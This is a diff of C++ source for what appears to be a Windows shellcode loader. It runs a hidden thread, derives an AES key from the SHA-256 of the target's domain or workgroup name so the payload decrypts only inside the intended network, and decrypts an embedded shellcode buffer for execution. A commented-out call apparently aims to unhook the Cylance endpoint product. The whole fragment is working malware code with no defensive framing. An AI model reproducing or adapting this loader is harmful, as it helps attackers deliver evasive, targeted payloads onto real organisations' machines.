@@ -24,7 +24,7 @@ int main() {
 	ZeroMemory(&pt, sizeof(pt));
 
 	pt.ThreadCreateFlags = CREATE_NO_WINDOW;
-	int sizeOfShellcode = SHELLCODE_LEN;
+	int sizeOfShellcode = LAUNCH_SHELLCODE_LEN;
 	pt.StackSpace = 0x00010000;
 
 	//Cylance::FreeLibraryCylance();
@@ -39,16 +39,18 @@ int main() {
 		// do something
 	}
 	else {
-		// do something else
+		exit(0);
 	}
 	int domainNameLen = lstrlenW(si.Workgroup);
 	char* key = new char[domainNameLen];
-	uint8_t* buf = (uint8_t*)& SHELLCODE_BUF;
+	uint8_t* buf = (uint8_t*)& LAUNCH_SHELLCODE_BUF;
 
 	char* domainName = new char[domainNameLen];
 	char* sha256_uname = new char[256];
+
 	ZeroMemory(sha256_uname, 256);
-	DWORD sha_bytes_returned;
+	DWORD sha_bytes_returned = 256;
+
 	size_t charsConverted;
 
 	if (si.Domain == NULL && si.Workgroup != NULL) {
@@ -61,7 +63,7 @@ int main() {
 	if (!OptCrypto::GetSHA256Hash(domainName, domainNameLen, (BYTE*)sha256_uname, &sha_bytes_returned))
 		exit(-2);
 
-	uint8_t* dec_buf = OptCrypto::AESCBCDecrypt(buf, (uint8_t*)sha256_uname, (uint8_t*)IV, SHELLCODE_LEN);
+	uint8_t* dec_buf = OptCrypto::AESCBCDecrypt(buf, (uint8_t*)sha256_uname, (uint8_t*)LAUNCH_IV, LAUNCH_SHELLCODE_LEN);
 	
 	ProcExecute pe;
 	ZeroMemory(&pe, sizeof(ProcExecute));
